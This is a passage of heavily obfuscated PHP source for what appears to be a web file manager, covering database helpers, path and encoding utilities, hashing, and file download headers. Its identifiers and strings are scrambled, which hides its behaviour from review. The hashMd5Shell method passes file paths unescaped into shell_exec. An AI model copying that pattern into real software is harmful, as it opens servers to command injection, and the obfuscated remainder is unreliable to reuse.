$Ç˙™›œß[$™Ã±ï‚°[42]], $™Ã±ï‚°[43] => $Ç˙™›œß[$™Ã±ï‚°[43]], $™Ã±ï‚°[45] => (bool) ($Ç˙™›œß[$™Ã±ï‚°[45]] === $™Ã±ï‚°[22]), $™Ã±ï‚°[47] => $Ç˙™›œß[$™Ã±ï‚°[66]], $™Ã±ï‚°[49] => (bool) $Ç˙™›œß[$™Ã±ï‚°[67]], $™Ã±ï‚°[52] => (bool) $Ç˙™›œß[$™Ã±ï‚°[67]]); } } return $ﬂ»„Ù⁄¸; } public function getTables($ÖÚäòÁÑ = '') { $Ÿã€‰˙Ú =& $_SERVER[Á≈ ä ∞]; $ƒ€†‹¨∆ = $this->query($Ÿã€‰˙Ú[55] . $Ÿã€‰˙Ú[56] . $Ÿã€‰˙Ú[57]); $ÂöÇ’¿∫ = array(); foreach ($ƒ€†‹¨∆ as $Àì„ùµÍ => $Å∫˚«Èƒ) { $ÂöÇ’¿∫[$Àì„ùµÍ] = current($Å∫˚«Èƒ); } return $ÂöÇ’¿∫; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $§˘‘ÄºÁ =& $_SERVER[Á≈ ä ∞]; $this->error = $this->_linkID->lastErrorMsg(); if ($§˘‘ÄºÁ[22] != $this->queryStr) { $this->error .= LNG($§˘‘ÄºÁ[58]) . $this->queryStr; } think_trace($this->error, $§˘‘ÄºÁ[22], $§˘‘ÄºÁ[59]); return $this->error; } public function escapeString($§ñ¬∏Ÿ˛) { $⁄√ØÙÌ’ =& $_SERVER[Á≈ ä ∞]; if ($this->_linkID) { return $this->_linkID->escapeString($§ñ¬∏Ÿ˛); } return str_ireplace($⁄√ØÙÌ’[68], $⁄√ØÙÌ’[69], $§ñ¬∏Ÿ˛); } public function parseLimit($È◊• ï¥) { $úõ¯Ω˜• =& $_SERVER[Á≈ ä ∞]; $¶¥∑›°€ = $úõ¯Ω˜•[22]; if (!empty($È◊• ï¥)) { $È◊• ï¥ = explode($úõ¯Ω˜•[60], $È◊• ï¥); if (count($È◊• ï¥) > 1) { $¶¥∑›°€ .= $úõ¯Ω˜•[61] . $È◊• ï¥[1] . $úõ¯Ω˜•[62] . $È◊• ï¥[0] . $úõ¯Ω˜•[63]; } else { $¶¥∑›°€ .= $úõ¯Ω˜•[61] . $È◊• ï¥[0] . $úõ¯Ω˜•[63]; } } return $¶¥∑›°€; } } class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $î¯¶Õˆ⁄ =& $_SERVER[Á≈ ä ∞]; $this->objectDriver = array($î¯¶Õˆ⁄[70], $î¯¶Õˆ⁄[71], $î¯¶Õˆ⁄[72], $î¯¶Õˆ⁄[73], $î¯¶Õˆ⁄[74], $î¯¶Õˆ⁄[75], $î¯¶Õˆ⁄[76], $î¯¶Õˆ⁄[77], $î¯¶Õˆ⁄[78]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($î˘ÑåÌê) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($î˘ÑåÌê, $_SERVER[Á≈ ä ∞][18]); } return $î˘ÑåÌê; } public function iconvApp($¸îÕïÆÇ) { return $¸îÕïÆÇ; } public function iconvSystem($˘ÊÀÜŸÆ) { return $˘ÊÀÜŸÆ; } public function iconvTo($¬ºçûñî, $‹Œƒ®Ôµ, $àÏË∫ªÅ) { $˚’øê¥û =& $_SERVER[Á≈ ä ∞]; if (!$¬ºçûñî || !function_exists($˚’øê¥û[79])) { return $¬ºçûñî; } static $√ıµ≤ø— = array(); $⁄“∆ó≠ƒ = $‹Œƒ®Ôµ . $˚’øê¥û[80] . $àÏË∫ªÅ . $˚’øê¥û[81] . $¬ºçûñî; if (isset($√ıµ≤ø—[$⁄“∆ó≠ƒ])) { return $√ıµ≤ø—[$⁄“∆ó≠ƒ]; } if (function_exists($˚’øê¥û[82])) { $¿«”‚ﬁÓ = @mb_convert_encoding($¬ºçûñî, $àÏË∫ªÅ, $‹Œƒ®Ôµ); } else { $¿«”‚ﬁÓ = @iconv($‹Œƒ®Ôµ, $àÏË∫ªÅ, $¬ºçûñî); } $¿«”‚ﬁÓ = $¿«”‚ﬁÓ ? $¿«”‚ﬁÓ : $¬ºçûñî; if (strstr($¿«”‚ﬁÓ, $˚’øê¥û[83])) { $¿«”‚ﬁÓ = str_replace($˚’øê¥û[83], $˚’øê¥û[21], $¿«”‚ﬁÓ); } $√ıµ≤ø—[$‹Œƒ®Ôµ . $˚’øê¥û[80] . $àÏË∫ªÅ . $˚’øê¥û[81] . $¬ºçûñî] = $¿«”‚ﬁÓ; $√ıµ≤ø—[$àÏË∫ªÅ . $˚’øê¥û[80] . $‹Œƒ®Ôµ . $˚’øê¥û[81] . $¬ºçûñî] = $¬ºçûñî; $√ıµ≤ø—[$àÏË∫ªÅ . $˚’øê¥û[80] . $‹Œƒ®Ôµ . $˚’øê¥û[81] . $¿«”‚ﬁÓ] = $¬ºçûñî; $√ıµ≤ø—[$‹Œƒ®Ôµ . $˚’øê¥û[80] . $àÏË∫ªÅ . $˚’øê¥û[81] . $¿«”‚ﬁÓ] = $¿«”‚ﬁÓ; return $¿«”‚ﬁÓ; } public function getPathInner($πƒÆ—Ì˛) { $”¶Ωù∫ß = IO::init($πƒÆ—Ì˛); return $”¶Ωù∫ß->path; } public function getPathOuter($åúñ™∂´) { $∫¸éèéö =& $_SERVER[Á≈ ä ∞]; $§≥ﬁŒóÜ = strlen(trim($this->pathBase, $∫¸éèéö[18])); $åúñ™∂´ = substr(trim($åúñ™∂´, $∫¸éèéö[18]), $§≥ﬁŒóÜ); return $this->pathDriver . $∫¸éèéö[18] . ltrim($åúñ™∂´, $∫¸éèéö[18]); } public function isParentOf($â∂‹≥„ô, $Õ≤¡€Ïì) { $ú∆ïˆ≥≥ =& $_SERVER[Á≈ ä ∞]; $â∂‹≥„ô = rtrim(strtolower($â∂‹≥„ô), $ú∆ïˆ≥≥[18]) . $ú∆ïˆ≥≥[18]; $Õ≤¡€Ïì = rtrim(strtolower($Õ≤¡€Ïì), $ú∆ïˆ≥≥[18]) . $ú∆ïˆ≥≥[18]; $ãˆòØü≈ = strpos($Õ≤¡€Ïì, $â∂‹≥„ô) === 0; return $ãˆòØü≈; } public function getType() { $„∞≤Ãîµ =& $_SERVER[Á≈ ä ∞]; $Ø‰˜´˝ª = str_replace($„∞≤Ãîµ[84], $„∞≤Ãîµ[22], get_class($this)); return strtolower($Ø‰˜´˝ª); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($®ßÎΩõ¸, $Ü◊¬À¬€) { $¥ﬂåØ∏Õ =& $_SERVER[Á≈ ä ∞]; $ƒ‘ΩáÃ˛ = rtrim($®ßÎΩõ¸, $¥ﬂåØ∏Õ[18]) . $¥ﬂåØ∏Õ[18] . $Ü◊¬À¬€; $Ç˘À¯®ù = $this->exist($ƒ‘ΩáÃ˛); return $Ç˘À¯®ù ? $ƒ‘ΩáÃ˛ : !1; } public function setModifyTime($µî›ú˚±, $£ƒ®Ö≥¿ = '') { } public function renameObject($è´≈Ú¥Ü, $≈úíﬂ∑∏) { $ÜØÌ°ÛÓ = $≈úíﬂ∑∏; $è´≈Ú¥Ü = $this->getPathOuter($è´≈Ú¥Ü); $≈úíﬂ∑∏ = $this->pathFather($è´≈Ú¥Ü) . $≈úíﬂ∑∏; $õÌÒÎÎÔ = IO::copy($è´≈Ú¥Ü, $this->pathFather($è´≈Ú¥Ü), REPEAT_RENAME_FOLDER, $ÜØÌ°ÛÓ); if ($õÌÒÎÎÔ) { IO::remove($è´≈Ú¥Ü); } return $õÌÒÎÎÔ ? $≈úíﬂ∑∏ : !1; } public function tempFile($ê∏„Ì¯Ë = '', $˙∞ÔÌ¬¬ = '') { if (!$ê∏„Ì¯Ë) { $ê∏„Ì¯Ë = rand_string(15); } $ÒÍÎÓ¶π = TEMP_FILES . rand_string(15) . $_SERVER[Á≈ ä ∞][18]; @mkdir($ÒÍÎÓ¶π, DEFAULT_PERRMISSIONS, !0); $Ë¬ÛÁó© = $ÒÍÎÓ¶π . $ê∏„Ì¯Ë; @touch($Ë¬ÛÁó©); if ($˙∞ÔÌ¬¬) { file_put_contents($Ë¬ÛÁó©, $˙∞ÔÌ¬¬); } return $Ë¬ÛÁó©; } public function tempFileRemve($«∂ﬂ◊ôæ) { @unlink($«∂ﬂ◊ôæ); @rmdir($this->pathFather($«∂ﬂ◊ôæ)); } public function mkfile($ñ˝ÅÂœÂ, $¶Ê‰’ıﬁ = '', $Í·ò∞˛§ = REPEAT_RENAME) { } public function mkdir($·Ã∞Èﬂ¯, $⁄É–çˆ§ = REPEAT_SKIP) { } public function delFile($Œ´Î™û†) { } public function delFolder($•Ÿ¯úÀÕ) { } public function copyFile($Û¶ù”èﬁ, $„ÚÛ®‰Ÿ) { } public function moveFile($ìÔÂÂ¨ø, $±Î¬àï°) { } public function remove($¡∫Ä“ß∆) { if ($this->isFile($¡∫Ä“ß∆)) { return $this->delFile($¡∫Ä“ß∆); } return $this->delFolder($¡∫Ä“ß∆); } public function rename($Îúì≥êü, $óÔó˝™˘) { } public function exist($±à«˜ì∏) { } public function findByHash($≥ Ω…‚∞ = '', $ñ†€·ç∑ = '') { return !1; } public function isFile($∆ˆ˘óÂä) { } public function isFolder($æ¶ƒè‚ª) { } public function size($ıª√’˝◊) { } public function info($¥ãê…Î´) { } public function infoSimple($àÍÇçã«) { return $this->info($àÍÇçã«); } public function infoAuth($ßêÛ”˙Â) { return $this->info($ßêÛ”˙Â); } public function infoFull($œ‡çÊ¢¿) { return $this->info($œ‡çÊ¢¿); } public function infoWithChildren($˙ﬂÉ¶’À) { $©ï‡Äı“ =& $_SERVER[Á≈ ä ∞]; static $˘∏›˙‰„ = array(); if (isset($˘∏›˙‰„[$˙ﬂÉ¶’À])) { return $˘∏›˙‰„[$˙ﬂÉ¶’À]; } $õºæÄ˙í = $this->info($˙ﬂÉ¶’À); if ($õºæÄ˙í && $õºæÄ˙í[$©ï‡Äı“[43]] == $©ï‡Äı“[85]) { $≥˜Í´Êÿ = array($©ï‡Äı“[86] => 0, $©ï‡Äı“[87] => 0, $©ï‡Äı“[88] => 0); $this->infoChildren($˙ﬂÉ¶’À, $≥˜Í´Êÿ); $õºæÄ˙í[$©ï‡Äı“[86]] = $≥˜Í´Êÿ[$©ï‡Äı“[86]]; $õºæÄ˙í[$©ï‡Äı“[89]] = array($©ï‡Äı“[90] => $≥˜Í´Êÿ[$©ï‡Äı“[87]], $©ï‡Äı“[91] => $≥˜Í´Êÿ[$©ï‡Äı“[88]]); $˘∏›˙‰„[$˙ﬂÉ¶’À] = $õºæÄ˙í; } return $õºæÄ˙í; } public function listPath($˙·§ñ”â, $»ß∂πãï = false) { } public function has($°Ú≥ë‹Ø, $§∞ÕÈ≠≥ = false, $⁄Çé”∑Â = false) { } public function canRead($∆µÅöÔ◊) { } public function canWrite($Ó¯¡äêù) { } public function getContent($Õ©∫€ÿŒ) { } public function setContent($åÇ†ƒâ◊, $˚Ü◊©˚é = '') { } protected function infoChildren($‹„÷Éâﬁ, &$êãà˘≠Å) { $†∂⁄ﬂ‘ë =& $_SERVER[Á≈ ä ∞]; check_abort_echo(); $˘‹ù‡´— = $this->listPath($‹„÷Éâﬁ, !0); $˘‹ù‡´— = array_merge($˘‹ù‡´—[$†∂⁄ﬂ‘ë[92]], $˘‹ù‡´—[$†∂⁄ﬂ‘ë[93]]); foreach ($˘‹ù‡´— as $≤⁄£çŒ˘) { if ($≤⁄£çŒ˘[$†∂⁄ﬂ‘ë[43]] == $†∂⁄ﬂ‘ë[85]) { $êãà˘≠Å[$†∂⁄ﬂ‘ë[88]]++; $’íåç‘∑ = $this->getPathInner($≤⁄£çŒ˘[$†∂⁄ﬂ‘ë[94]]); $this->infoChildren($’íåç‘∑, $êãà˘≠Å); } else { $êãà˘≠Å[$†∂⁄ﬂ‘ë[87]]++; $êãà˘≠Å[$†∂⁄ﬂ‘ë[86]] += $≤⁄£çŒ˘[$†∂⁄ﬂ‘ë[86]]; } } } public function fileSubstr($É§è†ñ›, $Ñ˙ó≈äí, $•ˆ©ƒÜ´) { } public function listAll($…˝´¢ô•) { } public function listAllMake($ÑÉÉ‹¢—, &$∏ïÖÉ¿∞) { $˙€’≤∏Ï =& $_SERVER[Á≈ ä ∞]; check_abort_echo(); $§åÖü¡Ê = $this->listPath($ÑÉÉ‹¢—, !0); if (!$§åÖü¡Ê) { return; } $Œ°⁄ﬂ≤˛ = array_merge($§åÖü¡Ê[$˙€’≤∏Ï[92]], $§åÖü¡Ê[$˙€’≤∏Ï[93]]); foreach ($Œ°⁄ﬂ≤˛ as $Ñ·ä˚ÅÆ) { $ÕíÙöÙ≤ = $Ñ·ä˚ÅÆ[$˙€’≤∏Ï[43]] == $˙€’≤∏Ï[85]; $÷«Ìƒ¿· = array($˙€’≤∏Ï[94] => $Ñ·ä˚ÅÆ[$˙€’≤∏Ï[94]], $˙€’≤∏Ï[85] => $ÕíÙöÙ≤); if (isset($Ñ·ä˚ÅÆ[$˙€’≤∏Ï[86]])) { $÷«Ìƒ¿·[$˙€’≤∏Ï[86]] = $Ñ·ä˚ÅÆ[$˙€’≤∏Ï[86]]; } if (isset($Ñ·ä˚ÅÆ[$˙€’≤∏Ï[95]])) { $÷«Ìƒ¿·[$˙€’≤∏Ï[95]] = $Ñ·ä˚ÅÆ[$˙€’≤∏Ï[95]]; } if (!$ÕíÙöÙ≤) { $∏ïÖÉ¿∞[] = $÷«Ìƒ¿·; continue; } $∏ïÖÉ¿∞[] = $÷«Ìƒ¿·; $¬´´ä®Ì = $Ñ·ä˚ÅÆ[$˙€’≤∏Ï[94]]; $Æ˘£ßÑø = $this->pathDriver; if (substr($Ñ·ä˚ÅÆ[$˙€’≤∏Ï[94]], 0, strlen($Æ˘£ßÑø)) == $Æ˘£ßÑø) { $¬´´ä®Ì = substr($¬´´ä®Ì, strlen($Æ˘£ßÑø)); } $this->listAllMake($¬´´ä®Ì, $∏ïÖÉ¿∞); } } public function listAllSimple($‹«¡Û˛ª) { $≈ä±«ÄÏ =& $_SERVER[Á≈ ä ∞]; $˜À≠¢ä¶ = array(); $ïÆ∑§ìõ = $this->listAll($‹«¡Û˛ª); $µìÎÁ∏‘ = $this->getPathOuter($‹«¡Û˛ª); foreach ($ïÆ∑§ìõ as $˜∂ıÉŒª) { $Ûµ˘¶Ü¯ = $˜∂ıÉŒª[$≈ä±«ÄÏ[94]]; $’«ÂíÈ… = $˜∂ıÉŒª[$≈ä±«ÄÏ[94]]; if (isset($˜∂ıÉŒª[$≈ä±«ÄÏ[96]])) { $Ûµ˘¶Ü¯ = $˜∂ıÉŒª[$≈ä±«ÄÏ[96]][$≈ä±«ÄÏ[94]]; $˜∂ıÉŒª[$≈ä±«ÄÏ[86]] = $˜∂ıÉŒª[$≈ä±«ÄÏ[96]][$≈ä±«ÄÏ[86]]; $˜∂ıÉŒª[$≈ä±«ÄÏ[95]] = $˜∂ıÉŒª[$≈ä±«ÄÏ[96]][$≈ä±«ÄÏ[95]]; } else { $’«ÂíÈ… = substr($˜∂ıÉŒª[$≈ä±«ÄÏ[94]], strlen(get_path_father($µìÎÁ∏‘))); $’«ÂíÈ… = $≈ä±«ÄÏ[18] . ltrim($’«ÂíÈ…, $≈ä±«ÄÏ[18]); } $Ì…—∑ ö = array($≈ä±«ÄÏ[94] => $’«ÂíÈ…, $≈ä±«ÄÏ[85] => $˜∂ıÉŒª[$≈ä±«ÄÏ[85]]); if (isset($˜∂ıÉŒª[$≈ä±«ÄÏ[86]]) && !$˜∂ıÉŒª[$≈ä±«ÄÏ[85]]) { $Ì…—∑ ö[$≈ä±«ÄÏ[86]] = $˜∂ıÉŒª[$≈ä±«ÄÏ[86]]; } if (isset($˜∂ıÉŒª[$≈ä±«ÄÏ[95]])) { $Ì…—∑ ö[$≈ä±«ÄÏ[95]] = $˜∂ıÉŒª[$≈ä±«ÄÏ[95]]; } if (!$˜∂ıÉŒª[$≈ä±«ÄÏ[85]]) { $Ì…—∑ ö[$≈ä±«ÄÏ[97]] = $Ûµ˘¶Ü¯; } $˜À≠¢ä¶[] = $Ì…—∑ ö; } return $˜À≠¢ä¶; } public function upload($÷è∫éÄ˝, $“‘¬ÖËÙ, $ü´€‡ïÍ = false, $˙∆·¯‡˚ = REPEAT_REPLACE) { } public function uploadFileByID($è˝∞ËÈ‰, $Ωı£±Áﬁ, $‚Ùï§Ÿˆ) { } public function uploadFileByPath($Èˆëû∂Ô, $ØÜƒÇæá, $¬∑‰ÄÇ¸ = array()) { } public function isUploadServer() { $õä†∞∆À =& $_SERVER[Á≈ ä ∞]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $õä†∞∆À[98]) { return !0; } return $GLOBALS[$õä†∞∆À[16]][$õä†∞∆À[99]][$õä†∞∆À[100]]; } public function isFileOutServer() { $πÓ¶∫„ª =& $_SERVER[Á≈ ä ∞]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $πÓ¶∫„ª[98]) { return !0; } return $GLOBALS[$πÓ¶∫„ª[16]][$πÓ¶∫„ª[99]][$πÓ¶∫„ª[101]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($–Éˆúéõ) { $ıŸ°±öÉ =& $_SERVER[Á≈ ä ∞]; if (!$this->isCdnHost()) { return $–Éˆúéõ; } return str_replace(trim(get_url_root($–Éˆúéõ), $ıŸ°±öÉ[18]), trim($this->cdnHost, $ıŸ°±öÉ[18]), $–Éˆúéõ); } public function uploadLink($îœô⁄≠Û, $πÿá≈√“ = 0) { $∞ÊèÓû÷ =& $_SERVER[Á≈ ä ∞]; if ($this->isUploadServer()) { return; } $“ø⁄ç«„ = $this->getType(); if (!in_array($“ø⁄ç«„, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $–Â≤ã“ = 1024 * 1024 * 10; $ÕÇ§Ù§˙ = $πÿá≈√“ <= $–Â≤ã“ ? $∞ÊèÓû÷[102] : $∞ÊèÓû÷[103]; $œ‡¸Ù–¨ = (!$πÿá≈√“ ? 1 : ceil($πÿá≈√“ / pow(1024, 3))) * 3600 * 4; $ÒëÚè‹ú = $this->{$ÕÇ§Ù§˙}($îœô⁄≠Û, $œ‡¸Ù–¨); if ($ÒëÚè‹ú) { $ÒëÚè‹ú[$∞ÊèÓû÷[104]] = $îœô⁄≠Û; $ÒëÚè‹ú[$∞ÊèÓû÷[105]] = $“ø⁄ç«„; } return $ÒëÚè‹ú; } public function uploadFormData($˙‹ëÌÔ√, $ƒö‰ñ˘€ = 3600) { } public function multiUploadFormData($¿œË≈ßù, $µµ˛ÿ˘Ê = 3600) { } public function download($Ú÷√ …», $™Ó‡†∞–) { } public function ext($†ß‘ŒÖÑ) { $ÒÖ∑±Ê» =& $_SERVER[Á≈ ä ∞]; if (strpos($†ß‘ŒÖÑ, $ÒÖ∑±Ê»[18]) === -1) { $Ë˚öêíí = $†ß‘ŒÖÑ; } else { $Ë˚öêíí = $this->pathThis($†ß‘ŒÖÑ); } $∂É¢ÑÅ’ = $ÒÖ∑±Ê»[22]; if (strstr($Ë˚öêíí, $ÒÖ∑±Ê»[20])) { $∂É¢ÑÅ’ = substr($Ë˚öêíí, strrpos($Ë˚öêíí, $ÒÖ∑±Ê»[20]) + 1); $∂É¢ÑÅ’ = strtolower($∂É¢ÑÅ’); } if (strlen($∂É¢ÑÅ’) > 3 && preg_match($ÒÖ∑±Ê»[106], $∂É¢ÑÅ’, $“ç˝Ä√û)) { $∂É¢ÑÅ’ = $ÒÖ∑±Ê»[22]; } return $∂É¢ÑÅ’; } public function pathThis($¬é”√€¸) { $≤≠¢ã®ô =& $_SERVER[Á≈ ä ∞]; $¬é”√€¸ = str_replace($≤≠¢ã®ô[107], $≤≠¢ã®ô[18], rtrim($¬é”√€¸, $≤≠¢ã®ô[18])); $ä∆ö”≤ƒ = strrpos($¬é”√€¸, $≤≠¢ã®ô[18]); if ($ä∆ö”≤ƒ === !1) { return $¬é”√€¸; } return substr($¬é”√€¸, $ä∆ö”≤ƒ + 1); } public function pathFather($çù§™Ôå) { $Å∂úë±´ =& $_SERVER[Á≈ ä ∞]; $çù§™Ôå = str_replace($Å∂úë±´[107], $Å∂úë±´[18], rtrim($çù§™Ôå, $Å∂úë±´[18])); $Éä©˜¯å = strrpos($çù§™Ôå, $Å∂úë±´[18]); if ($Éä©˜¯å === !1) { return $Å∂úë±´[22]; } return substr($çù§™Ôå, 0, $Éä©˜¯å + 1); } public function hashSimple($∫»»ã®í) { $ë‹˝‹Æ± =& $_SERVER[Á≈ ä ∞]; if (!$∫»»ã®í) { return md5($ë‹˝‹Æ±[22]); } $˚¸å¥¡¯ = $this->size($∫»»ã®í); $˝ﬂÇñÇ¨ = 200; $≠à„Ø•‹ = 50; if ($˚¸å¥¡¯ <= $˝ﬂÇñÇ¨ * $≠à„Ø•‹) { return $this->hashMd5($∫»»ã®í) . $˚¸å¥¡¯; } $ÿ∑´ã≈˘ = intval($˚¸å¥¡¯ / $≠à„Ø•‹); $·í”È¸ = $ë‹˝‹Æ±[22]; for ($≥ó‰ëΩû = 0; $≥ó‰ëΩû < $≠à„Ø•‹; $≥ó‰ëΩû++) { $·í”È¸ .= $this->fileSubstr($∫»»ã®í, $ÿ∑´ã≈˘ * $≥ó‰ëΩû, $˝ﬂÇñÇ¨); } $·í”È¸ .= $this->fileSubstr($∫»»ã®í, $˚¸å¥¡¯ - $˝ﬂÇñÇ¨, $˝ﬂÇñÇ¨); return md5($·í”È¸) . $˚¸å¥¡¯; } public static $md5Cache = array(); public function hashMd5($Â¢æ»…∂) { if (!$Â¢æ»…∂) { return md5($_SERVER[Á≈ ä ∞][22]); } $Â¢æ»…∂ = $this->iconvSystem($Â¢æ»…∂); if (isset(self::$md5Cache[$Â¢æ»…∂])) { return self::$md5Cache[$Â¢æ»…∂]; } self::$md5Cache[$Â¢æ»…∂] = $this->hashMd5Shell($Â¢æ»…∂); if (!self::$md5Cache[$Â¢æ»…∂]) { self::$md5Cache[$Â¢æ»…∂] = @md5_file($Â¢æ»…∂); } return self::$md5Cache[$Â¢æ»…∂]; } private function hashMd5Shell($´∂ôﬂı€) { $àè∫ùà° =& $_SERVER[Á≈ ä ∞]; if (!$´∂ôﬂı€) { return md5($àè∫ùà°[22]); } if (!function_exists($àè∫ùà°[108])) { return !1; } $‚ç∂õÜ‰ = array($àè∫ùà°[109], $àè∫ùà°[110]); $Ì´¸îﬂ‹ = Cache::get($àè∫ùà°[111]); if (!$Ì´¸îﬂ‹) { $‡›‰˜ïù = BASIC_PATH . $àè∫ùà°[112]; $∆àÙ∫»° = md5_file($‡›‰˜ïù); $Ì´¸îﬂ‹ = $àè∫ùà°[113]; foreach ($‚ç∂õÜ‰ as $˙Í˘°—°) { $∆∏·Ãﬂ‰ = shell_exec($˙Í˘°—° . "\40\x22{$‡›‰˜ïù}\42"); if ($∆∏·Ãﬂ‰ && substr(trim($∆∏·Ãﬂ‰), 0, 32) == $∆àÙ∫»°) { $Ì´¸îﬂ‹ = $˙Í˘°—°; break; } } Cache::set($àè∫ùà°[111], $Ì´¸îﬂ‹, 3600); } if ($Ì´¸îﬂ‹ == $àè∫ùà°[113]) { return !1; } $∆∏·Ãﬂ‰ = shell_exec($Ì´¸îﬂ‹ . "\x20\42{$´∂ôﬂı€}\x22"); $∆∏·Ãﬂ‰ = str_replace($àè∫ùà°[114], $àè∫ùà°[22], $∆∏·Ãﬂ‰); return substr($∆∏·Ãﬂ‰, 0, 32); } public function link($”à˝ó™◊) { return $”à˝ó™◊; } public function fileOut($˜ªƒø¨Ω, $”ôÈ¯õƒ = false, $…≈ïÿß≥ = false, $ï∆Ä”®î = '') { $ﬂÊø¬ÁÃ =& $_SERVER[Á≈ ä ∞]; $this->cacheMethod(null, null); if (!$˜ªƒø¨Ω || !$this->exist($˜ªƒø¨Ω)) { show_json(LNG($ﬂÊø¬ÁÃ[115]), !1, $…≈ïÿß≥); } $∫ü∆Íá“ = $this->getType() == $ﬂÊø¬ÁÃ[116]; $Õº…›ö‘ = $GLOBALS[$ﬂÊø¬ÁÃ[16]][$ﬂÊø¬ÁÃ[99]][$ﬂÊø¬ÁÃ[117]][$ﬂÊø¬ÁÃ[118]]; $Ë√Ü›úÀ = (double) $GLOBALS[$ﬂÊø¬ÁÃ[16]][$ﬂÊø¬ÁÃ[99]][$ﬂÊø¬ÁÃ[117]][$ﬂÊø¬ÁÃ[119]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $∑∑Ëˆé∞ = $this->infoFull($˜ªƒø¨Ω); $Ü∫Ò‘ı™ = $∑∑Ëˆé∞[$ﬂÊø¬ÁÃ[86]]; $›»˘Ó∆ã = gmdate($ﬂÊø¬ÁÃ[120], $∑∑Ëˆé∞[$ﬂÊø¬ÁÃ[95]]); $–’îÈ˛π = $…≈ïÿß≥ ? $…≈ïÿß≥ : $this->iconvApp($∑∑Ëˆé∞[$ﬂÊø¬ÁÃ[42]]); $è‹øçü≠ = 0; $ä™±Æ§∞ = $Ü∫Ò‘ı™ - 1; $◊¬Ï©À⁄ = $this->ext($–’îÈ˛π); if (in_array($◊¬Ï©À⁄, array($ﬂÊø¬ÁÃ[121], $ﬂÊø¬ÁÃ[122], $ﬂÊø¬ÁÃ[123], $ﬂÊø¬ÁÃ[124]))) { $◊¬Ï©À⁄ = $ﬂÊø¬ÁÃ[125]; } if (in_array($◊¬Ï©À⁄, array($ﬂÊø¬ÁÃ[126]))) { $◊¬Ï©À⁄ = $ﬂÊø¬ÁÃ[127]; } if (!$ï∆Ä”®î) { $ï∆Ä”®î = md5($›»˘Ó∆ã . $this->hashSimple($˜ªƒø¨Ω)); } $ï∆Ä”®î = $ﬂÊø¬ÁÃ[128] . $ï∆Ä”®î . $ﬂÊø¬ÁÃ[128]; $≤‡∂ŸÏ  = get_file_mime($◊¬Ï©À⁄); $¿¯ÅâªÆ = !0; $¿¯ÅâªÆ = isset($_GET[$ﬂÊø¬ÁÃ[129]]) ? !1 : !0; if ($”ôÈ¯õƒ === !1 && !mime_support($≤‡∂ŸÏ )) { $≤‡∂ŸÏ  = $ﬂÊø¬ÁÃ[130]; } header($ﬂÊø¬ÁÃ[131]); header($ﬂÊø¬ÁÃ[132] . $≤‡∂ŸÏ ); $¶®ò€æë = rawurlencode($–’îÈ˛π); $¶®ò€æë = $ﬂÊø¬ÁÃ[128] . $¶®ò€æë . $ﬂÊø¬ÁÃ[133] . $¶®ò€æë; if ($”ôÈ¯õƒ) { header($ﬂÊø¬ÁÃ[134]); header($ﬂÊø¬ÁÃ[135] . $¶®ò€æë); } else { if ($¿¯ÅâªÆ) { header($ﬂÊø¬ÁÃ[136] . $¶®ò€æë); } } header($ﬂÊø¬ÁÃ[137] . gmdate($ﬂÊø¬ÁÃ[120], time() + 3600 * 24 * 30) . $ﬂÊø¬ÁÃ[138]); header($ﬂÊø¬ÁÃ[139]); header($ﬂÊø¬ÁÃ[140]); header($ﬂÊø¬ÁÃ[141]); if (isset($_SERVER[$ﬂÊø¬ÁÃ[142]]) && strtotime($_SERVER[$ﬂÊø¬ÁÃ[142]]) == $∑∑Ëˆé∞[$ﬂÊø¬ÁÃ[95]]) { header($ﬂÊø¬ÁÃ[143], !0, 304); die; } if (isset($_SERVER[$ﬂÊø¬ÁÃ[144]]) && $_SERVER[$ﬂÊø¬ÁÃ[144]] == $ï∆Ä”®î) { header($ﬂÊø¬ÁÃ[145] . $ï∆Ä”®î, !0, 304); die; } header($ﬂÊø¬ÁÃ[145] . $ï∆Ä”®î); header($ﬂÊø¬ÁÃ[146] . $›»˘Ó∆ã . $ﬂÊø¬ÁÃ[138]); header($ﬂÊø¬ÁÃ[147] . $–’îÈ˛π); header($ﬂÊø¬ÁÃ[148]); header($ﬂÊø¬ÁÃ[149] . $Ü∫Ò‘ı™); header($ﬂÊø¬ÁÃ[150]); if (!$”ôÈ¯õƒ && $◊¬Ï©À⁄ == $ﬂÊø¬ÁÃ[151]) { if ($Ü∫Ò‘ı™ > 1024 * 1024 * 5) { die; } $†¨≥„È„ = $this->getContent($˜ªƒø¨Ω); $†¨≥„È„ = Html::clearSVG($†¨≥„È„); header($ﬂÊø¬ÁÃ[152] . strlen($†¨≥„È„)); echo $†¨≥„È„; die; } $Ã¨–∏˚Œ = strtolower($_SERVER[$ﬂÊø¬ÁÃ[153]]); if ($∫ü∆Íá“ && $Ã¨–∏˚Œ && $Õº…›ö‘) { if (strstr($Ã¨–∏˚Œ, $ﬂÊø¬ÁÃ[154])) { header($ﬂÊø¬ÁÃ[155] . $˜ªƒø¨Ω); } else { if (strstr($Ã¨–∏˚Œ, $ﬂÊø¬ÁÃ[156])) { header($ﬂÊø¬ÁÃ[157] . $˜ªƒø¨Ω); } else { if (strstr($Ã¨–∏˚Œ, $ﬂÊø¬ÁÃ[158])) { header($ﬂÊø¬ÁÃ[159] . $˜ªƒø¨Ω); } } } if ($Ë√Ü›úÀ) { header($ﬂÊø¬ÁÃ[160] . $Ë√Ü›úÀ); } return; } if (isset($_SERVER[$ﬂÊø¬ÁÃ[161]])) { if (preg_match($ﬂÊø¬ÁÃ[162], $_SERVER[$ﬂÊø¬ÁÃ[161]], $ÕÑ‘ÂÏÔ)) { $è‹øçü≠ = intval($ÕÑ‘ÂÏÔ[1]); if (!empty($ÕÑ‘ÂÏÔ[2])) { $ä™±Æ§∞ = intval($ÕÑ‘ÂÏÔ[2]); } } header($ﬂÊø¬ÁÃ[163]); 